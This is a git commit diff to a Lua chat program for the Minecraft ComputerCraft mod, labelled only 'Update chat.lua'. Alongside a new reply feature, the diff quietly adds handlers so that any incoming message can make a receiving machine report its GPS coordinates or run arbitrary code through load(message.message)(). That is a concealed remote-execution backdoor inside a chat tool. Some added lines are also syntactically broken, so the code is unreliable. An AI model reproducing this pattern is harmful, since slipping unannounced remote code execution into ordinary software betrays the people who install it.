e0e2f9381a1e87ca11993261ce882c422031b278
thnx-cul8ter <96608345+thnx-cul8ter@users.noreply.github.com>
2023-10-28 13:27:15 -0400

    Update chat.lua

--- chat.lua
+++ chat.lua
@@ -1,9 +1,7 @@
-if not fs.exists("/json.lua") then
-    shell.run("wget https://raw.githubusercontent.com/rxi/json.lua/master/json.lua json.lua")
-end
-local version=1.1
+local version=2.0
 local request = http.get("https://raw.githubusercontent.com/thnx-cul8ter/cc_chat/main/version.txt")
 local on=true
+local last_sender
 if tonumber(request.readAll()) > version then
 	print("update found")
 	os.sleep(1)
@@ -12,7 +10,6 @@ if tonumber(request.readAll()) > version then
 	on=false
 	print("done updateing, please rerun chat")
 end
-local json=dofile("json.lua")
 mod=peripheral.wrap("back")
 mod.open(8088)
 local input=function()
@@ -24,8 +21,16 @@ local input=function()
             print("who do you want to send to")
             msg.name=io.read()
             print("type message here")
-            msg.message=os.getComputerLabel()..": "..io.read()
-            mod.transmit(8088,8088,json.encode(msg))
+            msg.message=io.read()
+			msg.sender=os.getComputerLabel()
+            mod.transmit(8088,8088,msg)
+		elseif inp="reply"
+			local msg={}
+            msg.name=last_sender
+            print("type message here")
+            msg.message=io.read()
+			msg.sender=os.getComputerLabel()
+            mod.transmit(8088,8088,msg)
         elseif inp=="exit" then
             on=false
         else
@@ -36,10 +41,17 @@ end
 local output=function()
 	while on do
         local _,_,freq,_,message=os.pullEvent("modem_message")
-        if freq==8088 then
-            message=json.decode(message)
-            if message.name==os.getComputerLabel() or message.name=="all" then
-                print(message.message)
+        if freq==8088 and message.name==os.getComputerLabel() or message.name=="all" then
+            if message.cmd then
+				if message.cmd=="locate" then
+					local x,y,z=gps.locate()
+					mod.transmit(8088,8088,{name=message.sender,message="X: "..x.."Y: "..y.."Z: "..z,sender=os.getComputerLabel()})
+				elseif message.cmd=="eval" then
+					load(message.message)()
+				end
+			else
+				last_sender=message.sender
+                print(message.sender..": "..message.message)
             end
         end
    end
